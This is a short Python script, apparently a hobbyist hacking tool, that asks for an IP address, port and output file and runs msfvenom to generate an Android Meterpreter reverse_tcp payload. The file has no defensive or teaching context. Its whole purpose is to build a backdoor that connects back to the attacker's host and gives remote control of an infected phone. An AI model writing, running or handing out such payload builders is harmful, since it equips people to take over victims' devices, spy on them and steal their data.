# Create by pound
import os, sys, time
os.system("clear")
os.system("figlet Create Payload")
IP = input("IP     : ")
Port = input("Port    : ")
R = input("Address Payload   : ")
os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s"%(IP, Port, R))
os.system("clear")
print("\nCreate Payload Success")
os.system("cat banner2.txt | lolcat")
